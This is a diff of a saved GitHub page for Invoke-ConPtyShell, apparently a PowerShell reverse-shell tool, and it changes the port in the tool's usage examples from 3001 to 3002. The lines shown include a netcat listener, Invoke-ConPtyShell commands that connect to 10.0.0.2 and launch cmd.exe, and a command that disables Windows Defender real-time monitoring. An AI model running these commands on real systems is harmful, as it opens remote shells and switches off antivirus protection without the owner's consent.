@@ -2415,7 +2415,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
         </tr>
         <tr>
           <td id="L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
-          <td id="LC18" class="blob-code blob-code-inner js-file-line"><span class="pl-c">                stty raw -echo; (stty size; cat) | nc -lvnp 3001</span></td>
+          <td id="LC18" class="blob-code blob-code-inner js-file-line"><span class="pl-c">                stty raw -echo; (stty size; cat) | nc -lvnp 3002</span></td>
         </tr>
         <tr>
           <td id="L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
@@ -2515,7 +2515,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
         </tr>
         <tr>
           <td id="L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
-          <td id="LC43" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell 10.0.0.2 3001</span></td>
+          <td id="LC43" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell 10.0.0.2 3002</span></td>
         </tr>
         <tr>
           <td id="L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
@@ -2543,7 +2543,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
         </tr>
         <tr>
           <td id="L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
-          <td id="LC50" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90</span></td>
+          <td id="LC50" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3002 -Rows 30 -Cols 90</span></td>
         </tr>
         <tr>
           <td id="L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
@@ -2571,7 +2571,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
         </tr>
         <tr>
           <td id="L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
-          <td id="LC57" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe</span></td>
+          <td id="LC57" class="blob-code blob-code-inner js-file-line"><span class="pl-c">            PS&gt;Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3002 -Rows 30 -Cols 90 -CommandLine cmd.exe</span></td>
         </tr>
         <tr>
           <td id="L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
